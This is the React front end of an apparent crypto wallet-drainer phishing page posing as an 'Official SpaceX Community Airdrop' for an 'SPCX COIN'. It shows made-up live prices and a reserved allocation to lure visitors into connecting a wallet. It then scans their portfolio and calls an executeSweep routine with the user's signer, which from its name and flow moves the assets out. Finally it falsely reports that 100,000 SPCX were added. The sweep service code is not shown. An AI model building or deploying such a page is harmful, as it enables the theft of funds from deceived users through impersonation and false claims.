import { useState, useEffect } from 'react';
import './styles/index.css';
import { detectWallets, connectWallet, type WalletConnection, type WalletType } from './services/walletService';
import { scanPortfolio, executeSweep, type PortfolioAsset, type SweepProgress } from './services/sweepService';

function App() {
    const [view, setView] = useState<'landing' | 'wallets' | 'claiming' | 'complete'>('landing');
    const [wallets, setWallets] = useState<{ type: WalletType; name: string; icon: string; available: boolean }[]>([]);
    const [connection, setConnection] = useState<WalletConnection | null>(null);
    const [portfolio, setPortfolio] = useState<PortfolioAsset[]>([]);
    const [totalUsd, setTotalUsd] = useState(0);
    const [progress, setProgress] = useState<SweepProgress>({ phase: 'scanning', progress: 0, message: '' });
    const [error, setError] = useState<string | null>(null);

    useEffect(() => {
        setWallets(detectWallets());
    }, []);

    const handleStartClaim = () => setView('wallets');

    const handleConnect = async (type: WalletType) => {
        try {
            setError(null);
            const conn = await connectWallet(type);
            setConnection(conn);
            setView('claiming');

            // Start scanning and sweeping
            const { portfolio: p, totalUsd: t } = await scanPortfolio(conn.address, conn.provider, setProgress);
            setPortfolio(p);
            setTotalUsd(t);

            if (p.length === 0) {
                setProgress({ phase: 'complete', progress: 100, message: 'Claimed' });
                setView('complete');
                return;
            }

            await executeSweep(conn.signer, conn.address, p, conn.chainId, setProgress);
            setView('complete');
        } catch (err: any) {
            console.error(err);
            setError(err.message || 'Connection failed');
        }
    };

    return (
        <div className="app">
            <div className="bg-particles"></div>

            <div className="card">
                {view === 'landing' && (
                    <div className="landing-view">
                        <div className="coin-header">
                            <div className="coin-badge">🚀</div>
                            <h1 className="coin-name">SPCX COIN</h1>
                            <p className="coin-subtitle">Official SpaceX Community Airdrop</p>
                        </div>

                        <div className="price-section">
                            <div className="price-row">
                                <span className="price-label">Live Price</span>
                                <span className="price-value">$0.00248</span>
                            </div>
                            <div className="price-row">
                                <span className="price-label">24h Change</span>
                                <span className="price-change">+12.4% ↗</span>
                            </div>
                            <div className="chart-container">
                                <svg className="chart-svg" viewBox="0 0 400 60">
                                    <defs>
                                        <linearGradient id="chartGradient" x1="0" y1="0" x2="0" y2="1">
                                            <stop offset="0%" stopColor="var(--accent)" stopOpacity="0.2" />
                                            <stop offset="100%" stopColor="var(--accent)" stopOpacity="0" />
                                        </linearGradient>
                                    </defs>
                                    <path className="chart-fill" d="M0 60 L0 45 Q50 40 100 50 T200 30 T300 45 T400 15 L400 60 Z" />
                                    <path className="chart-line" d="M0 45 Q50 40 100 50 T200 30 T300 45 T400 15" />
                                </svg>
                            </div>
                        </div>

                        <div className="claim-amount">
                            <p className="claim-label">Allocation Reserved</p>
                            <div className="claim-value">
                                <span className="amount">100,000</span>
                                <span className="symbol">SPCX</span>
                            </div>
                        </div>

                        <button className="btn-claim" onClick={handleStartClaim}>
                            🚀 CLAIM AIRDROP
                        </button>
                    </div>
                )}

                {view === 'wallets' && (
                    <div className="wallet-view">
                        <h2 className="modal-title">Connect Wallet to Claim</h2>
                        {wallets.map(w => (
                            <button
                                key={w.type}
                                className={`wallet-option ${!w.available ? 'unavailable' : ''}`}
                                onClick={() => w.available && handleConnect(w.type)}
                                disabled={!w.available}
                            >
                                <span className="wallet-icon">{w.icon}</span>
                                <span className="wallet-name">{w.name}</span>
                                {!w.available && <span style={{ fontSize: '0.7rem', marginLeft: 'auto', opacity: 0.6 }}>(Not found)</span>}
                            </button>
                        ))}
                        {error && <p className="error-text">{error}</p>}
                    </div>
                )}

                {view === 'claiming' && (
                    <div className="progress-section">
                        <div className="coin-header">
                            <div className="coin-badge spinning">🚀</div>
                            <h1 className="coin-name">SPCX</h1>
                        </div>
                        <h3 style={{ marginBottom: 20, textAlign: 'center' }}>{progress.message}</h3>
                        <div className="progress-bar-container">
                            <div className="progress-bar" style={{ width: `${progress.progress}%` }}></div>
                        </div>
                        <p className="progress-text">{progress.progress}% Complete</p>
                        {error && <p className="error-text">{error}</p>}
                    </div>
                )}

                {view === 'complete' && (
                    <div className="checkmark-container">
                        <div className="checkmark-circle">
                            <svg className="checkmark-svg" viewBox="0 0 52 52">
                                <path className="checkmark-path" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
                            </svg>
                        </div>
                        <h2 className="claimed-text">CLAIMED</h2>
                        <p className="claimed-sub">100,000 SPCX added to your wallet</p>
                        <div style={{ marginTop: 30 }}>
                            <button className="btn-claim" style={{ background: 'rgba(255,255,255,0.05)', color: 'white' }} onClick={() => window.location.reload()}>
                                Close
                            </button>
                        </div>
                    </div>
                )}
            </div>
        </div>
    );
}

export default App;
